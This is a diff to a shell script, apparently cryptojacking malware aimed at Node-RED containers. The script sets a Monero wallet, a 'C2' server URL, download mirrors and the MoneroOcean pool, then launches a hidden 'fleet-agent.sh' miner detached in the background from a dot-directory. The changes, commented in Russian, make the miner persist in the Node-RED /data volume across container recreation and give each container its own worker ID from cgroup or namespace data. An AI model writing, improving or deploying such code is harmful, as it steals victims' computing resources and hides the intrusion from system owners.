@@ -7,7 +7,19 @@ M1="${KF_M1:-https://edge-static.cdn-edge-e9d.workers.dev}"
 M2="${KF_M2:-https://raw.githubusercontent.com/z3ncv/cdn-edge/main}"
 W="${KF_WALLET:-42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79}"
 C2="${KF_C2:-https://node-red.elm-v1-staging.clodpi.io}"
-D="${KF_D:-/var/tmp/.kf}"
+# Рабочий каталог: /data — постоянный том Node-RED (переживает пересоздание контейнера).
+# Признак тома: отдельное устройство от / и ФС не tmpfs/ramfs. Нет /data — /var/tmp.
+D="${KF_D:-}"
+if [ -z "$D" ]; then
+  D=/var/tmp/.kf
+  if [ -d /data ] && [ -w /data ]; then
+    # bind/named volume виден в /proc/mounts; tmpfs и ramfs не считаем постоянными
+    if grep -q ' /data ' /proc/mounts 2>/dev/null \
+       && ! grep -Eq ' /data (tmpfs|ramfs|overlay) ' /proc/mounts 2>/dev/null; then
+      D=/data/.kf
+    fi
+  fi
+fi
 
 mkdir -p "$D" 2>/dev/null || { D=/tmp/.kf; mkdir -p "$D" 2>/dev/null; }
 [ -d "$D" ] || exit 1
@@ -60,16 +72,27 @@ if command -v md5sum >/dev/null 2>&1; then
 else
   M6=$(printf '%s' "${M:-$H}" | cksum | tr -dc '0-9' | cut -c1-4)
 fi
-WID="${KF_WID:-k7m-$H6$M6}"
+# третий суффикс: cgroup/pid-namespace. В контейнерах одного хоста machine-id и MAC
+# часто совпадают, а cgroup разный — иначе два контейнера получат один id и одну строку шар.
+N=""
+[ -r /proc/self/cgroup ] && N=$(cat /proc/self/cgroup 2>/dev/null)
+[ -z "$N" ] && N=$(readlink /proc/self/ns/pid 2>/dev/null)
+[ -z "$N" ] && N=$(readlink /proc/self/ns/mnt 2>/dev/null)
+if command -v md5sum >/dev/null 2>&1; then
+  N4=$(printf '%s' "${N:-$H$$}" | md5sum | cut -c1-4)
+else
+  N4=$(printf '%s' "${N:-$H$$}" | cksum | tr -dc '0-9' | cut -c1-4)
+fi
+WID="${KF_WID:-k7m-$H6$M6$N4}"
 
 LOG=/tmp/.kf-boot.log
 [ -w /tmp ] || LOG=/dev/null
 
 if command -v setsid >/dev/null 2>&1; then
-  KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
+  KF_D="$D" KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
     setsid sh "$D/fleet-agent.sh" "$C2" "$WID" >"$LOG" 2>&1 </dev/null &
 else
-  KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
+  KF_D="$D" KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
     nohup sh "$D/fleet-agent.sh" "$C2" "$WID" >"$LOG" 2>&1 </dev/null &
 fi
 
